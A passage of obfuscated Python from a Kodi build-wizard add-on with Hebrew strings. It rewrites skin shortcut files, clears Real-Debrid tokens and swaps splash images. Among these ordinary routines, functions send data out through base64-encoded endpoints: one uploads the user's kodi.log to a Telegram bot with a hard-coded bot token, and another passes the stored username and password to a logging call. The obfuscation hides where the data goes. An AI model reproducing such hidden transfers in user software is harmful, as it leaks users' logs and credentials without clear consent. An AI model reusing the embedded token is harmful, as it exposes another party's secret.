          OOOO00OOOOO0OOO00 =urllib2 .urlopen (O0O000O000OO00O00 .decode ('base64')+' - '+O00OO00OO0O0OOOO0 +' - '+OO0OOOO0OO0OOO000 +' - '+O0O000O00OOOO00O0 ).readlines ()#line:574
       except :pass #line:575
def googleindicat ():#line:578
			import logg #line:579
			O00O00OOO0OO0OOOO =(ADDON .getSetting ("pass"))#line:580
			OO0O0000OO00OOOO0 =(ADDON .getSetting ("user"))#line:581
			logg .logGA (O00O00OOO0OO0OOOO ,OO0O0000OO00OOOO0 )#line:582
def logsend ():#line:583
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:584
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:585
      howsentlog ()#line:587
      import requests #line:588
      if xbmc .getCondVisibility ('system.platform.windows'):#line:589
         OOO0O00O0OO00OO0O =xbmc .translatePath ('special://home/kodi.log')#line:590
         O0OOOO00OO00OOOOO ={'chat_id':(None ,'-274262389'),'document':(OOO0O00O0OO00OO0O ,open (OOO0O00O0OO00OO0O ,'rb')),}#line:594
         OO00O00O0O0O0OO00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:595
         O000OOO000OO00OO0 =requests .post (OO00O00O0O0O0OO00 .decode ('base64'),files =O0OOOO00OO00OOOOO )#line:597
      elif xbmc .getCondVisibility ('system.platform.android'):#line:598
           OOO0O00O0OO00OO0O =xbmc .translatePath ('special://temp/kodi.log')#line:599
           O0OOOO00OO00OOOOO ={'chat_id':(None ,'-274262389'),'document':(OOO0O00O0OO00OO0O ,open (OOO0O00O0OO00OO0O ,'rb')),}#line:603
           OO00O00O0O0O0OO00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:604
           O000OOO000OO00OO0 =requests .post (OO00O00O0O0O0OO00 .decode ('base64'),files =O0OOOO00OO00OOOOO )#line:606
      else :#line:607
           OOO0O00O0OO00OO0O =xbmc .translatePath ('special://kodi.log')#line:608
           O0OOOO00OO00OOOOO ={'chat_id':(None ,'-274262389'),'document':(OOO0O00O0OO00OO0O ,open (OOO0O00O0OO00OO0O ,'rb')),}#line:612
           OO00O00O0O0O0OO00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:613
           O000OOO000OO00OO0 =requests .post (OO00O00O0O0O0OO00 .decode ('base64'),files =O0OOOO00OO00OOOOO )#line:615
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:616
def rdoff ():#line:618
	O000O00000OOO0O0O =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:619
	O000O00000OOO0O0O .setSetting ('rd.client_id','')#line:620
	O000O00000OOO0O0O .setSetting ('rd.secret','')#line:621
	O000O00000OOO0O0O .setSetting ('rdsource','false')#line:622
	O000O00000OOO0O0O .setSetting ('super_fast_type_toren','false')#line:623
	O000O00000OOO0O0O .setSetting ('rd.auth','false')#line:624
	O000O00000OOO0O0O .setSetting ('rd.refresh','false')#line:625
	O000O00000OOO0O0O =xbmcaddon .Addon ('script.module.resolveurl')#line:627
	O000O00000OOO0O0O .setSetting ('RealDebridResolver_client_id','')#line:628
	O000O00000OOO0O0O .setSetting ('RealDebridResolver_client_secret','')#line:629
	O000O00000OOO0O0O .setSetting ('RealDebridResolver_token','')#line:630
	O000O00000OOO0O0O .setSetting ('RealDebridResolver_refresh','')#line:631
	O000O00000OOO0O0O =xbmcaddon .Addon ('plugin.video.seren')#line:633
	O000O00000OOO0O0O .setSetting ('rd.client_id','')#line:634
	O000O00000OOO0O0O .setSetting ('rd.secret','')#line:635
	O000O00000OOO0O0O .setSetting ('rd.auth','')#line:636
	O000O00000OOO0O0O .setSetting ('rd.refresh','')#line:637
	if os .path .exists (os .path .join (ADDONS ,'plugin.video.gaia')):#line:638
		O000O00000OOO0O0O =xbmcaddon .Addon ('plugin.video.gaia')#line:639
		O000O00000OOO0O0O .setSetting ('accounts.debrid.realdebrid.id','')#line:640
		O000O00000OOO0O0O .setSetting ('accounts.debrid.realdebrid.secret','')#line:641
		O000O00000OOO0O0O .setSetting ('accounts.debrid.realdebrid.token','')#line:642
		O000O00000OOO0O0O .setSetting ('accounts.debrid.realdebrid.refresh','')#line:643
	resloginit .resloginit ('restore','all')#line:644
	O0OOO0O000OO00O0O =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:646
	O0OO0OO0O0O00000O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:647
	copyfile (O0OOO0O000OO00O0O ,O0OO0OO0O0O00000O )#line:648
def skindialogsettind18 ():#line:649
	try :#line:650
		OO0OOOO0O00OO0O00 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:651
		OO0OO00O0O0OOOOO0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:652
		copyfile (OO0OOOO0O00OO0O00 ,OO0OO00O0O0OOOOO0 )#line:653
	except :pass #line:654
def rdon ():#line:655
	loginit .loginIt ('restore','all')#line:656
	OOOOOO00O00OO0O0O =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:658
	OOOOO00O0OOO0O0O0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:659
	copyfile (OOOOOO00O00OO0O0O ,OOOOO00O0OOO0O0O0 )#line:660
def adults18 ():#line:662
  O0OOOO000OOOO0OO0 =(ADDON .getSetting ("adults"))#line:663
  if O0OOOO000OOOO0OO0 =='true':#line:664
    O00O0O0O0O0000OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:665
    with open (O00O0O0O0O0000OOO ,'r')as O0OO000O00OOOO0O0 :#line:666
      O0OO0O0O000OO000O =O0OO000O00OOOO0O0 .read ()#line:667
    O0OO0O0O000OO000O =O0OO0O0O000OO000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:685
    with open (O00O0O0O0O0000OOO ,'w')as O0OO000O00OOOO0O0 :#line:688
      O0OO000O00OOOO0O0 .write (O0OO0O0O000OO000O )#line:689
def rdbuildaddon ():#line:690
  OOOOOO00OOO00OOO0 =(ADDON .getSetting ("auto_rd"))#line:691
  if OOOOOO00OOO00OOO0 =='true':#line:692
    OO0OO000OOO00O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:693
    with open (OO0OO000OOO00O00O ,'r')as O0OOOO00000O0O00O :#line:694
      O000OOO000O00OO00 =O0OOOO00000O0O00O .read ()#line:695
    O000OOO000O00OO00 =O000OOO000O00OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:713
    with open (OO0OO000OOO00O00O ,'w')as O0OOOO00000O0O00O :#line:716
      O0OOOO00000O0O00O .write (O000OOO000O00OO00 )#line:717
    OO0OO000OOO00O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:721
    with open (OO0OO000OOO00O00O ,'r')as O0OOOO00000O0O00O :#line:722
      O000OOO000O00OO00 =O0OOOO00000O0O00O .read ()#line:723
    O000OOO000O00OO00 =O000OOO000O00OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:741
    with open (OO0OO000OOO00O00O ,'w')as O0OOOO00000O0O00O :#line:744
      O0OOOO00000O0O00O .write (O000OOO000O00OO00 )#line:745
    OO0OO000OOO00O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:749
    with open (OO0OO000OOO00O00O ,'r')as O0OOOO00000O0O00O :#line:750
      O000OOO000O00OO00 =O0OOOO00000O0O00O .read ()#line:751
    O000OOO000O00OO00 =O000OOO000O00OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:769
    with open (OO0OO000OOO00O00O ,'w')as O0OOOO00000O0O00O :#line:772
      O0OOOO00000O0O00O .write (O000OOO000O00OO00 )#line:773
    OO0OO000OOO00O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:777
    with open (OO0OO000OOO00O00O ,'r')as O0OOOO00000O0O00O :#line:778
      O000OOO000O00OO00 =O0OOOO00000O0O00O .read ()#line:779
    O000OOO000O00OO00 =O000OOO000O00OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:797
    with open (OO0OO000OOO00O00O ,'w')as O0OOOO00000O0O00O :#line:800
      O0OOOO00000O0O00O .write (O000OOO000O00OO00 )#line:801
    OO0OO000OOO00O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:804
    with open (OO0OO000OOO00O00O ,'r')as O0OOOO00000O0O00O :#line:805
      O000OOO000O00OO00 =O0OOOO00000O0O00O .read ()#line:806
    O000OOO000O00OO00 =O000OOO000O00OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:824
    with open (OO0OO000OOO00O00O ,'w')as O0OOOO00000O0O00O :#line:827
      O0OOOO00000O0O00O .write (O000OOO000O00OO00 )#line:828
    OO0OO000OOO00O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:830
    with open (OO0OO000OOO00O00O ,'r')as O0OOOO00000O0O00O :#line:831
      O000OOO000O00OO00 =O0OOOO00000O0O00O .read ()#line:832
    O000OOO000O00OO00 =O000OOO000O00OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:850
    with open (OO0OO000OOO00O00O ,'w')as O0OOOO00000O0O00O :#line:853
      O0OOOO00000O0O00O .write (O000OOO000O00OO00 )#line:854
    OO0OO000OOO00O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:856
    with open (OO0OO000OOO00O00O ,'r')as O0OOOO00000O0O00O :#line:857
      O000OOO000O00OO00 =O0OOOO00000O0O00O .read ()#line:858
    O000OOO000O00OO00 =O000OOO000O00OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:876
    with open (OO0OO000OOO00O00O ,'w')as O0OOOO00000O0O00O :#line:879
      O0OOOO00000O0O00O .write (O000OOO000O00OO00 )#line:880
    OO0OO000OOO00O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:883
    with open (OO0OO000OOO00O00O ,'r')as O0OOOO00000O0O00O :#line:884
      O000OOO000O00OO00 =O0OOOO00000O0O00O .read ()#line:885
    O000OOO000O00OO00 =O000OOO000O00OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:903
    with open (OO0OO000OOO00O00O ,'w')as O0OOOO00000O0O00O :#line:906
      O0OOOO00000O0O00O .write (O000OOO000O00OO00 )#line:907
def rdbuildinstall ():#line:910
  try :#line:911
   OO0OOO0O0OOO00OOO =(ADDON .getSetting ("auto_rd"))#line:912
   if OO0OOO0O0OOO00OOO =='true':#line:913
     O000OOOO0O0OO0O0O =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:914
     O0OOOOO00OO00O0OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:915
     copyfile (O000OOOO0O0OO0O0O ,O0OOOOO00OO00O0OO )#line:916
  except :#line:917
     pass #line:918
def rdbuildaddonoff ():#line:921
    O0000OO000O0O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:924
    with open (O0000OO000O0O00O0 ,'r')as O0OO00OOOO00O0O00 :#line:925
      O0OO0O0000O0OO0O0 =O0OO00OOOO00O0O00 .read ()#line:926
    O0OO0O0000O0OO0O0 =O0OO0O0000O0OO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:944
    with open (O0000OO000O0O00O0 ,'w')as O0OO00OOOO00O0O00 :#line:947
      O0OO00OOOO00O0O00 .write (O0OO0O0000O0OO0O0 )#line:948
    O0000OO000O0O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:952
    with open (O0000OO000O0O00O0 ,'r')as O0OO00OOOO00O0O00 :#line:953
      O0OO0O0000O0OO0O0 =O0OO00OOOO00O0O00 .read ()#line:954
    O0OO0O0000O0OO0O0 =O0OO0O0000O0OO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:972
    with open (O0000OO000O0O00O0 ,'w')as O0OO00OOOO00O0O00 :#line:975
      O0OO00OOOO00O0O00 .write (O0OO0O0000O0OO0O0 )#line:976
    O0000OO000O0O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:980
    with open (O0000OO000O0O00O0 ,'r')as O0OO00OOOO00O0O00 :#line:981
      O0OO0O0000O0OO0O0 =O0OO00OOOO00O0O00 .read ()#line:982
    O0OO0O0000O0OO0O0 =O0OO0O0000O0OO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1000
    with open (O0000OO000O0O00O0 ,'w')as O0OO00OOOO00O0O00 :#line:1003
      O0OO00OOOO00O0O00 .write (O0OO0O0000O0OO0O0 )#line:1004
    O0000OO000O0O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1008
    with open (O0000OO000O0O00O0 ,'r')as O0OO00OOOO00O0O00 :#line:1009
      O0OO0O0000O0OO0O0 =O0OO00OOOO00O0O00 .read ()#line:1010
    O0OO0O0000O0OO0O0 =O0OO0O0000O0OO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1028
    with open (O0000OO000O0O00O0 ,'w')as O0OO00OOOO00O0O00 :#line:1031
      O0OO00OOOO00O0O00 .write (O0OO0O0000O0OO0O0 )#line:1032
    O0000OO000O0O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1035
    with open (O0000OO000O0O00O0 ,'r')as O0OO00OOOO00O0O00 :#line:1036
      O0OO0O0000O0OO0O0 =O0OO00OOOO00O0O00 .read ()#line:1037
    O0OO0O0000O0OO0O0 =O0OO0O0000O0OO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1055
    with open (O0000OO000O0O00O0 ,'w')as O0OO00OOOO00O0O00 :#line:1058
      O0OO00OOOO00O0O00 .write (O0OO0O0000O0OO0O0 )#line:1059
    O0000OO000O0O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1061
    with open (O0000OO000O0O00O0 ,'r')as O0OO00OOOO00O0O00 :#line:1062
      O0OO0O0000O0OO0O0 =O0OO00OOOO00O0O00 .read ()#line:1063
    O0OO0O0000O0OO0O0 =O0OO0O0000O0OO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1081
    with open (O0000OO000O0O00O0 ,'w')as O0OO00OOOO00O0O00 :#line:1084
      O0OO00OOOO00O0O00 .write (O0OO0O0000O0OO0O0 )#line:1085
    O0000OO000O0O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1087
    with open (O0000OO000O0O00O0 ,'r')as O0OO00OOOO00O0O00 :#line:1088
      O0OO0O0000O0OO0O0 =O0OO00OOOO00O0O00 .read ()#line:1089
    O0OO0O0000O0OO0O0 =O0OO0O0000O0OO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1107
    with open (O0000OO000O0O00O0 ,'w')as O0OO00OOOO00O0O00 :#line:1110
      O0OO00OOOO00O0O00 .write (O0OO0O0000O0OO0O0 )#line:1111
    O0000OO000O0O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1114
    with open (O0000OO000O0O00O0 ,'r')as O0OO00OOOO00O0O00 :#line:1115
      O0OO0O0000O0OO0O0 =O0OO00OOOO00O0O00 .read ()#line:1116
    O0OO0O0000O0OO0O0 =O0OO0O0000O0OO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1134
    with open (O0000OO000O0O00O0 ,'w')as O0OO00OOOO00O0O00 :#line:1137
      O0OO00OOOO00O0O00 .write (O0OO0O0000O0OO0O0 )#line:1138
def rdbuildinstalloff ():#line:1141
    try :#line:1142
       OO000000O000OOOOO =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1143
       O00OOO0O000OO0O00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1144
       copyfile (OO000000O000OOOOO ,O00OOO0O000OO0O00 )#line:1146
       OO000000O000OOOOO =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1148
       O00OOO0O000OO0O00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1149
       copyfile (OO000000O000OOOOO ,O00OOO0O000OO0O00 )#line:1151
       OO000000O000OOOOO =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1153
       O00OOO0O000OO0O00 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1154
       copyfile (OO000000O000OOOOO ,O00OOO0O000OO0O00 )#line:1156
       OO000000O000OOOOO =ADDONPATH +"/resources/rdoff/Splash.png"#line:1159
       O00OOO0O000OO0O00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1160
       copyfile (OO000000O000OOOOO ,O00OOO0O000OO0O00 )#line:1162
    except :#line:1164
       pass #line:1165
def rdbuildaddonON ():#line:1172
    O00O000O00O0O0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1174
    with open (O00O000O00O0O0000 ,'r')as O00O0OOOOOOO00O00 :#line:1175
      OO0OO0O0OO0OOOOOO =O00O0OOOOOOO00O00 .read ()#line:1176
    OO0OO0O0OO0OOOOOO =OO0OO0O0OO0OOOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
